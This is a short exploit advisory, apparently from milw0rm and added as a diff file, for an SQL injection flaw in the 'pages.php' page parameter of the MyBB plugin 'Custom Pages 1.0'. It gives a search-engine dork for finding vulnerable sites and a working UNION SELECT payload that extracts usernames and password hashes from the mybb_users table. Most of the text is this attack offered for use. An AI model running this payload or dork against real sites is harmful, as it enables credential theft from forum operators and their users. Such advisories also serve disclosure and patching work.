@@ -1,0 +1,29 @@
+###################################################################################
+#										  #
+# MyBulletin Board (MyBB) Plugin "Custom Pages 1.0" - SQL Injection Vulnerability #
+#										  #
+#    found by: Lidloses_Auge 							  #
+#    Greetz to: free-hack.com							  #
+#										  #
+###############################################################################################################################################
+#																	      #
+# Vulnerability:															      #
+#																	      #
+#    Document:      pages.php														      #
+#    GET-Parameter: page														      #
+#																	      #
+# Dork:																	      #
+#																	      #
+#    inurl:"pages.php" + intext:"powered by mybb"											      #
+#																	      #
+# Example:																      #
+#																	      #
+#    http://[target]/pages.php?page='union/**/select/**/1,unhex(hex(concat_ws(0x202d20,username,password))),3,4,5,6,7/**/FROM/**/mybb_users/* #
+#																	      #
+# Notes:																      #
+#																	      #
+#    Successrate depends on the permissions which could be set for viewing the 'page'						              #
+#																	      #
+###############################################################################################################################################
+
+# milw0rm.com [2008-04-06]
